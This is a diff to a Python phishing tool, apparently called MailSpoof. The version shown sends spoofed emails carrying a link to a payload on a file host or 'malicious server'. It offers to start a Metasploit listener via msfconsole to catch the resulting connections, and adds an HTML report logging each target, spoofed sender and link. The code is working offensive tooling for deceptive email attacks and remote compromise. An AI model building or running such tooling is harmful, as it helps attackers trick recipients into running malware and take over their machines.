@@ -40,7 +40,8 @@ def banner ():
 .||     ||. `|..||. .||. .||.     |...|'  ||..|' .||. `|..|' .||.   `|..'
                                           ||                             
                                          .||                             
-                                                                                                                       
+                                               
+				   v1.1                                                                        
 """, color='red')
 
 
@@ -50,17 +51,16 @@ def banner ():
 def setup ():
 
 	# Setup the config file
-	global targetName
 	global targetEmail
 	global spoofName
 	global email
 	global password
 	global subject
 	global message
+	global emailImage
 
 	configParser = ConfigParser.RawConfigParser()	
 	configParser.read('config')
-	targetName = configParser.get('Config', 'targetName')
 	targetEmail = configParser.get('Config', 'targetEmail')
 	spoofName  = configParser.get('Config', 'spoofName')
 	email    = configParser.get('Config', 'email')
@@ -69,7 +69,7 @@ def setup ():
 	message = configParser.get('Config', 'message')
 
 	# Validate the input.
-	if (spoofName == 'None' or email == 'None' or password == 'None' or targetEmail == 'None' or targetName == 'None'):
+	if (spoofName == 'None' or email == 'None' or password == 'None' or targetEmail == 'None'):
 		color_print('[!] Please setup your config file.', color='red')	
 		return
 
@@ -97,7 +97,7 @@ def connect():
 
 			try:
 				# Send the mail.
-				sendEmail(yag, email, targetEmail, spoofName)
+				sendEmail(yag, email, targetEmail, spoofName, subject, message)
 			except KeyboardInterrupt:
 				color_print("Thanks, Happy hacking", color='blue')
 		
@@ -111,10 +111,11 @@ def connect():
 		# Failed to connect!!.
 		color_print("\n[!] Could not connect to the server.", color='red')
 		return
-def sendEmail (server, fromAddr, toAddr, spoofName):
+def sendEmail (server, fromAddr, toAddr, spoofName, subject, message):
 
 	# Tell the user to upload there file.
 	color_print("Upload it to a free file hosting website: https://nofile.io/", color='yellow')
+	color_print("OR Paste in the IP Address of your malicious server", color='yellow')
 	time.sleep(2)
 	link = raw_input("\nPaste the link to your file: \n")		
 	while len(link) == 0: link = raw_input("Paste the link to your file: ")
@@ -129,10 +130,11 @@ def sendEmail (server, fromAddr, toAddr, spoofName):
 	time.sleep(1)
 
 	# Create the specially crafted link.
-	html = '<a href="'+link+'">'+link+'/a>'
+	html = '<a href="'+link+'">'+link+'</a>'
 
 	# Send the message.
 	server.send(fromAddr, subject, [message, html])
+	color_print("\n[*] Email sent", color='green')
 
 	# Do you want to listen for any connections.
 	listen = raw_input('Do you want to start up a listener: [Y/N]: ')
@@ -142,9 +144,12 @@ def sendEmail (server, fromAddr, toAddr, spoofName):
 		# Listen for a connection
 		listenForConnections()
 	else:
-		color_print("Thanks, Happy hacking", color='blue')
+		color_print("[+] Generated a report..", color='green')
+		generateHTML(fromAddr, toAddr, spoofName, subject, message, html)
+		color_print("\nThanks, Happy hacking", color='blue')
 		return	
-	color_print("\n[*] Email sent", color='green')
+	
+
 #
 # Listen for a connection
 #		
@@ -166,6 +171,36 @@ def listenForConnections ():
 	os.system('echo exploit -j -z >> resource.rc')
 	os.system('cat resource.rc')
 	os.system('msfconsole -r resource.rc')
+	
+
+# Generate a html report
+def generateHTML(fromemail, toemail, spoofemail, subject, message, link):		
+		f = open("reports/" + toemail + ".html", "w")
+		f.write("""
+<!DOCTYPE html>
+<html>
+<body style="background-color:white;">
+<title> MailSpoof Report </title>
+<table style="width:100%">
+  <tr>
+    <th>From Email</th>
+    <th>To Email</th> 
+    <th>Spoofed Email</th>
+    <th>Subject</th>
+    <th>Message</th>
+    <th>Link</th>
+  </tr>
+  <tr>
+    <td>""" + str(fromemail) +"""</td>
+    <td>""" + str(toemail) +"""</td>
+    <td>""" + str(spoofemail) +"""</td>
+    <td>""" + str(subject) +"""</td>
+    <td>""" + str(message) +"""</td>
+    <td>""" + str(link) + """</td>
+  </tr>
+</table>
+</html>""")
+		f.close()
 	
 
 #### Call the methods ####
